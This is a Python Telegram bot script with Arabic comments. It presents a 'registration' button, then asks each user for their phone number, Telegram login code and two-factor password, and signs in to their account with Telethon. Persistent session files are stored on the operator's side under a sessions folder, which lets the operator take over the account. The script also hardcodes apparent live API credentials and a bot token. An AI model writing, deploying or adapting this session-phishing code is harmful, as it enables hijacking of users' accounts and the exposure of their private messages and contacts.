import os
import telebot
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.tl.types import Message
import asyncio

# بيانات API من my.telegram.org
API_ID = 23656977
API_HASH = '49d3f43531a92b3f5bc403766313ca1e'
BOT_TOKEN = '8300609210:AAGHCu5Un2UDMEnxy4Oh-QCY1_kVDm3S6Ro'

# إنشاء كائن البوت
bot = telebot.TeleBot(BOT_TOKEN)

# تخزين بيانات المستخدمين المؤقتة
user_sessions = {}

# إنشاء مجلد الجلسات إذا لم يكن موجوداً
if not os.path.exists('sessions'):
    os.makedirs('sessions')

# معالج أمر البدء
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("تسجيل", callback_data='register'))
    
    bot.send_message(message.chat.id, 'مرحباً! اضغط على زر "تسجيل" لبدء عملية تسجيل الدخول.', reply_markup=markup)

# معالج الأزرار
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == 'register':
        user_id = call.from_user.id
        user_sessions[user_id] = {'step': 'request_phone'}
        bot.send_message(call.message.chat.id, 'يرجى إرسال رقم هاتفك مع رمز الدولة (مثال: +1234567890)')

# معالج الرسائل النصية
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    user_id = message.from_user.id
    text = message.text
    
    if user_id not in user_sessions:
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("تسجيل", callback_data='register'))
        bot.send_message(message.chat.id, 'مرحباً! اضغط على زر "تسجيل" لبدء عملية تسجيل الدخول.', reply_markup=markup)
        return
    
    if user_sessions[user_id]['step'] == 'request_phone':
        # طلب رقم الهاتف
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'request_code'
        
        # إنشاء وتخزين عميل Telethon
        client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
        user_sessions[user_id]['client'] = client
        
        # استخدام asyncio لتشغيل الكود غير المتزامن
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            loop.run_until_complete(client.connect())
            sent_code = loop.run_until_complete(client.send_code_request(phone))
            user_sessions[user_id]['phone_code_hash'] = sent_code.phone_code_hash
            
            bot.send_message(message.chat.id, 'تم إرسال رمز التحقق إلى هاتفك. يرجى إدخاله:')
        except Exception as e:
            bot.send_message(message.chat.id, f'حدث خطأ: {str(e)}')
            del user_sessions[user_id]
        finally:
            loop.close()
    
    elif user_sessions[user_id]['step'] == 'request_code':
        # معالجة رمز التحقق
        code = text.strip()
        client = user_sessions[user_id]['client']
        phone_code_hash = user_sessions[user_id]['phone_code_hash']
        phone = user_sessions[user_id]['phone']
        
        # استخدام asyncio لتشغيل الكود غير المتزامن
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            # محاولة تسجيل الدخول
            loop.run_until_complete(client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            ))
            
            # نجاح التسجيل
            bot.send_message(message.chat.id, 'تم تسجيل الدخول بنجاح!')
            loop.run_until_complete(client.disconnect())
            
            # مسح بيانات الجلسة المؤقتة
            del user_sessions[user_id]
            
        except SessionPasswordNeededError:
            # إذا كانت هناك حاجة إلى كلمة مرور ثنائية
            user_sessions[user_id]['step'] = 'request_2fa'
            bot.send_message(message.chat.id, 'يرجى إدخال كلمة المرور الثنائية:')
        
        except Exception as e:
            bot.send_message(message.chat.id, f'حدث خطأ أثناء التحقق: {str(e)}')
            loop.run_until_complete(client.disconnect())
            del user_sessions[user_id]
        finally:
            loop.close()
    
    elif user_sessions[user_id]['step'] == 'request_2fa':
        # معالجة كلمة المرور الثنائية
        password = text
        client = user_sessions[user_id]['client']
        
        # استخدام asyncio لتشغيل الكود غير المتزامن
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        try:
            loop.run_until_complete(client.sign_in(password=password))
            bot.send_message(message.chat.id, 'تم تسجيل الدخول بنجاح!')
            loop.run_until_complete(client.disconnect())
            del user_sessions[user_id]
        except Exception as e:
            bot.send_message(message.chat.id, f'حدث خطأ في كلمة المرور: {str(e)}')
            loop.run_until_complete(client.disconnect())
            del user_sessions[user_id]
        finally:
            loop.close()

if __name__ == '__main__':
    print("Bot is running...")
    bot.infinity_polling() 
